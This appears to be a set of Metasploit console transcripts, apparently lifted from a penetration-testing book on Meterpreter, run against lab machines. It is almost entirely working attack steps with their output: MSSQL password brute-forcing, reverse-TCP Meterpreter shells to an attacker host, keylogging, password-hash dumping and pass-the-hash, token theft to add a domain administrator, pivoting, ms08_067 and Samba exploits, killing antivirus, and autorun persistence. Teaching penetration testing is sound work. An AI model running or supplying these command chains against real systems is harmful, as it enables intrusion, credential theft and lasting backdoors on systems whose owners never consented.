["```\nmsf > `nmap -sT -A -P0 192.168.33.130` \n[*] exec: nmap -sT -A -P0 192.168.33.130\n\n`. . . SNIP. . .`\n\nPORT     STATE SERVICE      VERSION\n21/tcp   open  `ftp          Microsoft ftpd` \n25/tcp   open  `smtp         Microsoft ESMTP 6.0.2600.2180` \n80/tcp   open  `http         Microsoft IIS webserver 5.1` \n|_html-title: Directory Listing Denied\n135/tcp  open  msrpc        Microsoft Windows RPC\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds\n1025/tcp open  msrpc        Microsoft Windows RPC\n1433/tcp open  `ms-sql-s     Microsoft SQL Server 2005 9.00.1399; RTM` \n6646/tcp open  unknown\nMAC Address: 00:0C:29:EA:26:7C (VMware)\nDevice type: general purpose\nRunning: Microsoft Windows XP|2003\nOS details: Microsoft Windows XP Professional SP2  or Windows Server 2003\n\n`. . . SNIP . . .`\n\nNmap done: 1 IP address (1 host up) scanned in 37.58 seconds\n\nmsf >\n```", "```\nmsf > `nmap -sU 192.168.33.130 -p1434` \n\nNmap scan report for 192.168.33.130\nHost is up (0.00033s latency).\nPORT     STATE         SERVICE\n1434/udp open         ms-sql-m \n\nNmap done: 1 IP address (1 host up) scanned in 0.46 seconds\nmsf >\n```", "```\nmsf > `use scanner/mssql/mssql_ping`\nmsf auxiliary(mssql_ping) > `show options`\n\nModule options:\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   PASSWORD                   no        The password for the specified username\n   RHOSTS                     yes       The target address range or CIDR identifier\n   THREADS   1                yes       The number of concurrent threads\n   USERNAME  sa               no        The username to authenticate as\n\nmsf auxiliary(mssql_ping) > `set RHOSTS 192.168.33.1/24`\nRHOSTS => 192.168.33.1/24\nmsf auxiliary(mssql_ping) > `set THREADS 20`\nTHREADS => 20\nmsf auxiliary(mssql_ping) > `exploit`\n\n[*] Scanned 040 of 256 hosts (015% complete)\n[*] Scanned 052 of 256 hosts (020% complete)\n[*] Scanned 080 of 256 hosts (031% complete)\n[*] Scanned 115 of 256 hosts (044% complete)\n[*] SQL Server information for 192.168.33.130: \n[*]    ServerName      = IHAZSECURITY \n[*]    InstanceName    = SQLEXPRESS\n[*]    IsClustered     = No\n[*]    Version         = 9.00.1399.06 \n[*]    tcp             = 1433 \n[*]    np              = \\\\IHAZSECURITY\\pipe\\MSSQL$SQLEXPRESS\\sql\\query\n[*] Scanned 129 of 256 hosts (050% complete)\n```", "```\nmsf > `use scanner/mssql/mssql_login` \nmsf auxiliary(mssql_login) > `show options`\n\nModule options:\n\n   Name              Current Setting  Required  Description\n   ----              ---------------  --------  -----------\n   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5\n   PASSWORD                           no\n        The password for the specified username\n   PASS_FILE                          no\n        File containing passwords, one per line\n   RHOSTS                             yes       The target\n address range or CIDR identifier\n   RPORT             1433             yes       The target port\n   THREADS           1                yes       The number of concurrent threads\n   USERNAME          sa               no        The username to authenticate as\n   USERPASS_FILE                      no        File containing users and passwords\n                                                  separated by\n space, one pair per line\n   USER_FILE                          no        File containing\n usernames, one per line\n   VERBOSE           true             yes       Whether to print\n output for all attempts\n\nmsf auxiliary(mssql_login) >\n `set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt` \nPASS_FILE => /pentest/exploits/fasttrack/bin/dict/wordlist.txt\nmsf auxiliary(mssql_login) > `set RHOSTS 192.168.33.130`\nRHOSTS => 192.168.33.130\nmsf auxiliary(mssql_login) > `set THREADS 10`\nTHREADS => 10\nmsf auxiliary(mssql_login) > `set verbose false`\nverbose => false\nmsf auxiliary(mssql_login) > `exploit`\n[+] 192.168.33.130:1433 - MSSQL - successful login 'sa' : `'password123'` \n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```", "```\nmsf > `use windows/mssql/mssql_payload` \nmsf exploit(mssql_payload) > `show options`\n\nModule options:\n\n   Name          Current Setting  Required  Description\n   ----          ---------------  --------  -----------\n   PASSWORD                       no        The password for the specified username\n   RHOST                          yes       The target address\n   RPORT         1433             yes       The target port\n   USERNAME      sa               no        The username to authenticate as\n   UseCmdStager  true             no        Wait for user input before\n returning from exploit\n   VERBOSE       false            no        Enable verbose output\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\nmsf exploit(mssql_payload) > `set payload windows/meterpreter/reverse_tcp` \npayload => windows/meterpreter/reverse_tcp\nmsf exploit(mssql_payload) > `set LHOST 192.168.33.129`\nLHOST => 192.168.33.129\nmsf exploit(mssql_payload) > `set LPORT 443`\nLPORT => 443\nmsf exploit(mssql_payload) > `set RHOST 192.168.33.130`\nRHOST => 192.168.33.130\nmsf exploit(mssql_payload) > `set PASSWORD password123`\nPASSWORD => password123\nmsf exploit(mssql_payload) > `exploit`\n\n[*] Started reverse handler on 192.168.33.129:443\n[*] Command Stager progress - 2.78% done (1494/53679 bytes)\n[*] Command Stager progress - 5.57% done (2988/53679 bytes)\n[*] Command Stager progress - 8.35% done (4482/53679 bytes)\n\n`. . . SNIP . . .`\n\n[*] Command Stager progress - 97.32% done (52239/53679 bytes)\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 1 opened (192.168.33.129:443 -> 192.168.33.130:1699)\nmeterpreter > \n```", "```\nmeterpreter > `screenshot`\nScreenshot saved to: /opt/metasploit3/msf3/yVHXaZar.jpeg\n```", "```\nmeterpreter > `sysinfo`\nComputer: IHAZSECURITY\nOS      : Windows XP (Build 2600, Service Pack 2).\nArch    : x86\nLanguage: en_US\n```", "```\nmeterpreter > `ps` \n\nProcess list\n============\n\n PID   Name                 Arch  Session  User                          Path\n ---   ----                 ----  -------  ----                          ----\n 0     [System Process]\n 4     System               x86   0        NT AUTHORITY\\SYSTEM\n\n`. . . SNIP . . .`\n\n 1476  spoolsv.exe          x86    0        NT AUTHORITY\\SYSTEM           C:\\WINDOWS\\\n    system32\\spoolsv.exe\n 1668  explorer.exe \n       x86    0        IHAZSECURITY\\Administrator    C:\\WINDOWS\\\n    Explorer.EXE\n\n`. . . SNIP . . .`\n\n 4032  notepad.exe         x86    0        IHAZSECURITY\\Administrator    C:\\WINDOWS\\\n    system32\\notepad.exe\n\nmeterpreter > `migrate 1668` \n[*] Migrating to 1668...\n[*] Migration completed successfully.\nmeterpreter > `run post/windows/capture/keylog_recorder` \n[*] Executing module against V-MAC-XP\n[*] Starting the keystroke sniffer...\n[*] Keystrokes being saved in to /root/.msf3/loot/\n20110324171334_default_192.168.1.195_host.windows.key_179703.txt\n[*] Recording keystrokes...\n[*] Saving last few keystrokes...\n\nroot@bt:˜# `cat /root/.msf3/loot/20110324171334_`\n`default_192.168.1.195_host.windows.key_179703.txt` \nKeystroke log started at Thu Mar 24 17:13:34 −0600 2011\n\nadministrator password <Back>  <Back>  <Back>  <Back>  <Back>  <Back>\n  <Back>  <Tab> password123!!\n```", "```\nAdministrator:500:e52cac67419a9a22cbb699e2fdfcc59e \n :30ef086423f916deec378aac42c4ef0c :::\n```", "```\nmeterpreter > `use priv`\nLoading extension priv...success.\nmeterpreter > `run post/windows/gather/hashdump`\n[*] Obtaining the boot key...\n[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...\n[*] Obtaining the user list and keys...\n[*] Decrypting user keys...\n[*] Dumping password hashes...\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29:::\n```", "```\nmsf> `use windows/smb/psexec` \nmsf exploit(psexec)> `set PAYLOAD windows/meterpreter/reverse_tcp`\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(psexec)> `set LHOST 192.168.33.129`\nLHOST => 192.168.33.129\nmsf exploit(psexec)> `set LPORT 443`\nLPORT => 443\nmsf exploit(psexec)> `set RHOST 192.168.33.130`\nRHOST => 192.168.33.130\n\n`. . . SNIP . . .`\n\nmsf exploit(psexec)> `set SMBPass`\n`aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c` \nSMBPass => aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29\nmsf exploit(psexec)> `exploit`\n[*] Connecting to the server...\n[*] Started reverse handler\n[*] Authenticating as user 'Administrator'...\n[*] Uploading payload...\n[*] Created \\JsOvAFLy.exe...\n```", "```\nC:\\Documents and Settings\\Administrator>`net user bob password123 /add.`\n```", "```\nroot@bt:/opt/framework3/msf3# `msfpayload windows/meterpreter/reverse_tcp`\n`LHOST=192.168.33.129 LPORT=443 X > payload.exe` \nroot@bt:/opt/framework3/msf3# `msfcli multi/handler`\n `PAYLOAD=windows/meterpreter/reverse_tcp`\n`LHOST=192.168.33.129 LPORT=443 E` \n[*] Please wait while we load the module tree...\n[*] Started reverse handler on 192.168.33.129:443\n[*] Starting the payload handler...\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 1 opened (192.168.33.129:443 -> 192.168.33.130:1056)\nmeterpreter > `getuid` \nServer username: IHAZSECURITY\\bob\n```", "```\nmeterpreter > `shell` \nProcess 2896 created.\nChannel 1 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\nC:\\>`net user bob`\n\n`. . . SNIP . . .`\n\nLocal Group Memberships      *Users\nGlobal Group memberships     *None\nThe command completed successfully.\nC:\\>`^Z`\nBackground channel 1? [y/N]  `y`\n```", "```\nmeterpreter > `use priv`\nLoading extension priv...success.\nmeterpreter > `getsystem`\n...got system (via technique 4).\nmeterpreter > `getuid`\nServer username: NT AUTHORITY\\SYSTEM\n```", "```\nmeterpreter > `ps`\n\nProcess list\n============\n\n PID   Name                 Arch  Session  User                          Path\n ---   ----                 ----  -------  ----                          ----\n 0     [System Process]\n 4     System               x86   0        NT AUTHORITY\\SYSTEM\n380    cmd.exe              x86   0      SNEAKS.IN\\ihazdomainadmin\n   \\System\\\n    Root\\System32\\cmd.exe\n\n`. . . SNIP . . .`\n\nmeterpreter >\n```", "```\nmeterpreter > `steal_token 380`\nStolen token with username: SNEAKS.IN\\ihazdomainadmin\nmeterpreter >\n```", "```\nmeterpreter > `use incognito`\nLoading extension incognito...success.\nmeterpreter > `list_tokens -u`\n[-] Warning: Not currently running as SYSTEM, not all tokens will be available\n             Call rev2self if primary process token is SYSTEM\n\nDelegation Tokens Available\n========================================\nSNEAKS.IN\\ihazdomainadmin \nIHAZSECURITY\\Administrator\nNT AUTHORITY\\LOCAL SERVICE\nNT AUTHORITY\\NETWORK SERVICE\nNT AUTHORITY\\SYSTEM\n\nImpersonation Tokens Available\n========================================\nNT AUTHORITY\\ANONYMOUS LOGON\n```", "```\nmeterpreter > `impersonate_token SNEAKS.IN\\\\ihazdomainadmin` \n[+] Delegation token available\n[+] Successfully impersonated user SNEAKS.IN\\ihazdomainadmin\nmeterpreter > `add_user omgcompromised p@55w0rd! -h 192.168.33.50` \n[*] Attempting to add user omgcompromised to host 192.168.33.50\n[+] Successfully added user\nmeterpreter > `add_group_user \"Domain Admins\" omgcompromised -h 192.168.33.50`\n\n[*]   Attempting to add user omgcompromised to\n group Domain Admins on domain controller\n    192.168.33.50\n[+] Successfully added user to group\n```", "```\n[*] Meterpreter session 1 opened (10.10.1.129:443 -> 192.168.33.130:1075)\n\nmeterpreter > `run get_local_subnets` \nLocal subnet: 192.168.33.0/255.255.255.0\nmeterpreter > `background` \nmsf exploit(handler) > `route add 192.168.33.0 255.255.255.0 1` \nmsf exploit(handler) > `route print` \n\nActive Routing Table\n====================\n\n   Subnet             Netmask            Gateway\n   ------             -------            -------\n   192.168.33.0       255.255.255.0      Session 1 \n```", "```\nuse msf exploit(handler) > `use linux/samba/lsa_transnames_heap`\nmsf exploit(lsa_transnames_heap) > `set payload linux/x86/shell/reverse_tcp`\npayload => linux/x86/shell/reverse_tcp\nmsf exploit(lsa_transnames_heap) > `set LHOST 10.10.1.129` \nLHOST => 10.10.1.129\nmsf exploit(lsa_transnames_heap) > `set LPORT 8080`\nLPORT => 8080\nmsf exploit(lsa_transnames_heap) > `set RHOST 192.168.33.132` \nRHOST => 192.168.33.132\nmsf exploit(lsa_transnames_heap) > `ifconfig` \n[*] exec: ifconfig\n\neth0      Link encap:Ethernet  HWaddr 00:0c:29:47:e6:79\n          inet addr:10.10.1.129  Bcast:10.10.1.255  Mask:255.255.255.0\n          inet6 addr: fe80::20c:29ff:fe47:e679/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:23656 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:32321 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:4272582 (4.2 MB)  TX bytes:17849775 (17.8 MB)\n          Interrupt:19 Base address:0x2000\n\nlo        Link encap:Local Loopback\n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:600 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:600 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0\n          RX bytes:41386 (41.3 KB)  TX bytes:41386 (41.3 KB)\n\nmsf exploit(lsa_transnames_heap) > `exploit`\n\n[*] Started reverse handler on 10.10.1.129:8080\n[*] Creating nop sled....\n[*] Trying to exploit Samba with address 0xffffe410...\n[*] Connecting to the SMB service...\n[*] Binding to 12345778-1234-abcd-ef00-0123456789\nab:0.0@ncacn_np:192.168.33.132[\\lsarpc] ...\n[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@\nncacn_np:192.168.33.132[\\lsarpc] ...\n[*] Calling the vulnerable function...\n[+] Server did not respond, this is expected\n[*] Trying to exploit Samba with address 0xffffe411...\n[*] Connecting to the SMB service...\n[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0\n@ncacn_np:192.168.33.132[\\lsarpc] ...\n[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0\n@ncacn_np:192.168.33.132[\\lsarpc] ...\n[*] Calling the vulnerable function...\n[+] Server did not respond, this is expected\n[*] Trying to exploit Samba with address 0xffffe412...\n[*] Connecting to the SMB service...\n[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:\n0.0@ncacn_np:192.168.33.132[\\lsarpc] ...\n[*] Bound to 12345778-1234-abcd-ef00-0123\n456789ab:0.0@ncacn_np:192.168.33.132[\\lsarpc] ...\n[*] Calling the vulnerable function...\n[*] Sending stage (36 bytes)\n[*] Command shell session 1 opened (10.10.1.129:8080 -> 192.168.33.132:1608) \n```", "```\nmsf exploit(ms08_067_netapi) > `load auto_add_route`\n[*] Successfully loaded plugin: auto_add_route\n\nmsf exploit(ms08_067_netapi) > `exploit`\n[*] Started reverse handler on 10.10.1.129:443\n[*] Triggering the vulnerability...\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 1 opened (10.10.1.129:443 -> 192.168.33.130:1090)\n[*] AutoAddRoute: Routing new subnet 192.168.33.0/255.255.255.0 through session 1\n```", "```\nmeterpreter > `run vnc`\n[*] Creating a VNC reverse tcp stager: LHOST=192.168.33.129 LPORT=4545)\n[*] Running payload handler\n[*] VNC stager executable 37888 bytes long\n[*] Uploaded the VNC agent to C:\\WINDOWS\\TEMP\\CTDWtQC.exe (must be deleted manually)\n[*] Executing the VNC agent with endpoint 192.168.33.129:4545...\n[*] VNC Server session 2 opened (192.168.33.129:4545 -> 192.168.33.130:1091)\n```", "```\nmeterpreter > `run screen_unlock`\n[*] OS 'Windows XP (Build 2600, Service Pack 2).' found in known targets\n[*] patching...\n[*] done!\n```", "```\nmeterpreter > `run post/windows/manage/migrate`\n[*] Running module against V-MAC-XP\n[*] Current server process: revterp.exe (2436)\n[*] Migrating to explorer.exe...\n[*] Migrating into process ID 816\n[*] New server process: Explorer.EXE (816)\n```", "```\nmeterpreter > `run killav`\n[*] Killing Antivirus services on the target...\n[*] Killing off cmd.exe...\n[*] Killing off cmd.exe...\n```", "```\nmeterpreter > `run hashdump`\n[*] Obtaining the boot key...\n[*] Calculating the hboot key using SYSKEY de4b35306c5f595438a2f78f768772d2...\n[*] Obtaining the user list and keys...\n[*] Decrypting user keys...\n[*] Dumping password hashes...\n\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\n```", "```\nmeterpreter > `run packetrecorder -i 1`\n[*] Starting Packet capture on interface 1\n[*] Packet capture started\n```", "```\nmeterpreter > `run scraper`\n[*] New session on 192.168.33.130:1095...\n[*] Gathering basic system information...\n[*] Dumping password hashes...\n[*] Obtaining the entire registry...\n[*] Exporting HKCU\n[*] Downloading HKCU (C:\\WINDOWS\\TEMP\\XklepHOU.reg)\n```", "```\nmeterpreter > `run persistence -X -i 50 -p 443 -r 192.168.33.129`\n[*] Creating a persistent agent: LHOST=192.168.33.129\n LPORT=443 (interval=50 onboot=true)\n[*] Persistent agent script is 316384 bytes long\n[*] Uploaded the persistent agent to C:\\WINDOWS\\TEMP\\asSnqrlUDRwO.vbs\n[*] Agent executed with PID 3160\n[*] Installing into autorun as HKLM\\Software\\Microsoft\\Windows\n\\CurrentVersion\\Run\\xEYnaHedooc \n[*] Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\n    xEYnaHedooc\nmsf> `use multi/handler` \nmsf exploit(handler) > `set payload windows/meterpreter/reverse_tcp`\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > `set LPORT 443`\nLPORT => 443\nmsf exploit(handler) > `set LHOST 192.168.33.129`\nLHOST => 192.168.33.129\nmsf exploit(handler) > `exploit`\n\n[*] Started reverse handler on 192.168.33.129:443\n[*] Starting the payload handler...\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 2 opened (192.168.33.129:443 -> 192.168.33.130:1120) \n```", "```\nmeterpreter > `run post/windows/gather/hashdump`\n[*] Obtaining the boot key...\n[*] Calculating the hboot key using SYSKEY de4b35306c5f595438a2f78f768772d2...\n[*] Obtaining the user list and keys...\n[*] Decrypting user keys...\n[*] Dumping password hashes...\n```", "```\nmeterpreter > `run post/`\n```", "```\nroot@bt:/opt/framework3/msf3# `msfconsole`\nmsf > `search ms08_067`\n[*] Searching loaded modules for pattern 'ms08_067'...\n\nExploits\n========\n\n   Name                         Rank   Description\n   ----                         ----   -----------\n   windows/smb/ms08_067_netapi  great  Microsoft Server Service Relative Path Stack\n    Corruption\n\nmsf > `use windows/smb/ms08_067_netapi`\nmsf exploit(ms08_067_netapi) > `set PAYLOAD windows/shell/reverse_tcp`\npayload => windows/shell/reverse_tcp\nmsf exploit(ms08_067_netapi) > `set TARGET 3`\ntarget => 3\nmsf exploit(ms08_067_netapi) > `setg LHOST 192.168.33.129` \nLHOST => 192.168.33.129\nmsf exploit(ms08_067_netapi) > `setg LPORT 8080`\nLPORT => 8080\nmsf exploit(ms08_067_netapi) > `exploit -z` \n\n[*] Started reverse handler on 192.168.33.129:8080\n[*] Triggering the vulnerability...\n[*] Sending stage (240 bytes)\n[*] Command shell session 1 opened (192.168.33.129:8080 -> 192.168.33.130:1032)\n[*] Session 1 created in the background.\nmsf exploit(ms08_067_netapi) > `sessions -u 1` \n\n[*] Started reverse handler on 192.168.33.129:8080\n[*] Starting the payload handler...\n[*] Command Stager progress - 3.16% done (1694/53587 bytes)\n[*] Command Stager progress - 6.32% done (3388/53587 bytes)\n\n`. . . SNIP . . .`\n\n[*] Command Stager progress - 97.99% done (52510/53587 bytes)\n[*] Sending stage (748032 bytes)\nmsf exploit(ms08_067_netapi) > [*] Meterpreter session 2\n opened (192.168.33.129:8080 ->\n    192.168.33.130:1044)\nmsf exploit(ms08_067_netapi) > `sessions -i 2`\n[*] Starting interaction with 2...\nmeterpreter >\n```", "```\nmeterpreter > `irb`\n[*] Starting IRB shell\n[*] The 'client' variable holds the meterpreter client\n>> client.railgun.user32.MessageBoxA(0,\"hello\",\"world\",\"MB_OK\")\n```"]